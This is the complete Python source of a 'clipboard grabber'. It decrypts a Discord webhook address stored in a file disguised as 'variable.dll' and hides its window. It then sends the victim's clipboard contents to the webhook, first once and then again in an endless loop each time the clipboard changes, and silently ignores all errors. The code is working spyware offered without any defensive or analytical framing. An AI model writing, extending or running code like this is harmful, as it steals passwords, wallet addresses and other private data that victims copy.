import tkinter as tk
from cryptography.fernet import Fernet
import requests

key = "kDmCIvJsUp_5wsKgtJbGseJ36r4rn-te7vlCsyVfRCw="
file = "variable.dll"
with open(file, "rb") as thefile:
    contents = thefile.read()
    keyg = str(Fernet(key).decrypt(contents))
keyge = keyg.replace("'", "")
webhook = keyge.replace("b", "", 1) 


root = tk.Tk()
root.withdraw()

a = root.clipboard_get()

try:
    data = {"username" : "Zorillas Clipboard grabber"}

    #leave this out if you dont want an embed
    #for all params, see https://discordapp.com/developers/docs/resources/channel#embed-object
    data["embeds"] = [
        {
            "description" : a,
            "title" : "Clipboard updated!"
        }
    ]
    result = requests.post(webhook, json = data)
except:
    pass

while True:
    try:
        b = root.clipboard_get()
        if b != a:
            a = b
            data = {"username" : "Zorillas Clipboard grabber"}

            #leave this out if you dont want an embed
            #for all params, see https://discordapp.com/developers/docs/resources/channel#embed-object
            data["embeds"] = [
                {
                    "description" : a,
                    "title" : "Salamander#1710"
                }
            ]
            result = requests.post(webhook, json = data)
    except:
        pass
